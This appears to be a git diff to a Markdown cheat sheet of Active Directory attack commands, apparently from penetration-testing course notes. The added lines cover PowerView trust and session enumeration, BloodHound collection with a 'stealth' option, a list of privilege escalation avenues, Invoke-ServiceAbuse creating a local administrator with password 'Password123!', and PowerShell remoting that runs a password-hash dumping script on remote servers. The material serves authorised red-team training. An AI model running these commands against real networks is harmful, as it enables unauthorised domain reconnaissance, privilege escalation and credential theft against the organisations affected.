@@ -396,6 +396,9 @@ Get-ForestDomain
 # List all trust of the domains of the current forest
 Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name}
 
+# List external trusts (TrusteAttributes == FILTER_SIDS)
+Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
 # Get Global Catalogs in the current Forest
 Get-ForestGlobalCatalog
 
@@ -434,8 +437,12 @@ Find-DomainLocalGroupMember -Verbose
 
 # Enumerates the local group memberships for all reachable machines the <domain>
 Find-DomainLocalGroupMember -Domain <domain>
-# Looks for machines where a domain administrator is logged on
-Invoke-UserHunter                                                 
+
+# Looks for machines where a domain administrator (or specified user/groups) is logged on
+# It enumerates users and computers, then use Get-NetSession and Get-NetLoggedon to find sessions
+FindDomainUserLocation -Verbose
+FindDomainUserLocation -UserGroupIdentity "RDPUsers"
+
 # Confirm access to the machine as an administrator
 Invoke-UserHunter -CheckAccess                                    
 ```
@@ -466,6 +473,9 @@ Link: [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 . .\SharpHound.exe --CollectionMethod All
 # Gather data and information
 Invoke-BloodHound -CollectionMethod All -Verbose
+# Remove noisy collection mehods (RDP, DCOM, PSremote..)
+Invoke-BloodHound --stealth
+# Dont' --ExcludeDCs  
 ```
 
 ### Gui-Graph Queries
@@ -514,6 +524,17 @@ match (n:Computer) return properties(n)
 
 # Local Privilege Escalation
 
+```powershell
+# Typical ways
+# - MIssing patches
+# - Autologn
+# - AlwaysInstallElevated
+# - Misconfigured Services
+# - DLL Hijacking
+# - NTLM Relay
+# etc...
+```
+
 ### Using PowerUp:
 ```powershell
 . .\PowerUp.ps1
@@ -534,14 +555,22 @@ Link: [PrivEsc](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)
 ```powershell
 # Performs all checks
 Invoke-AllChecks                                                         
+
 # Get services with unquoted paths and a space in their name
 Get-ServiceUnquoted -Verbose                                             
+
 # Get services where the current user can write to its binary path or change arguments to the binary
 Get-ModifiableServiceFile -Verbose                                       
+
 # Get the services whose configuration current user can modify
 Get-ModifiableService -Verbose                                           
-# Let's add our current domain user to the local Administrators group 
-Invoke-ServiceAbuse -Name 'software_xxx' -UserName 'corporate\student01'
+
+# This command abuses service "SVC_xxx" to create a user john with password "Password123!" and add it to local admin group
+Invoke-ServiceAbuse -Name 'SVC_xxx'
+
+# This command abuses service "SVC_xxx" to change and existing users adding it to local admin group
+Invoke-ServiceAbuse -Name 'SVC_xxx' -UserName 'corporate\student01'
+
 ```
 - **With PrivEsc:**
 ```powershell
@@ -553,18 +582,27 @@ Invoke-Privesc
 
 - **Powershell Remoting:**
 ```powershell
+
 # Execute whoami & hostname commands on the indicated server
 Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          
+
 # Execute the script Git-PassHashes.ps1 on the indicated server
 Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local
+
 # Enable Powershell Remoting on current Machine
 Enable-PSRemoting
-# Start a new session
+
+# Start a new session and enter it:
 $sess = New-PSSession -ComputerName <Name>
-# Enter the Session
 Enter-PSSession $sess
+
+# Start a new session
 Enter-PSSession -ComputerName <Name>
-Enter-PSSession -ComputerName -Sessions <Sessionname>
+Enter-PSSession -ComputerName -Sessions $sess
+
+# External script that find machines in the domain the current user has local admin access to
+Find-PSRemotingLocalAdminAccess
+
 ```
 
 - **Invoke-Mimikatz:**
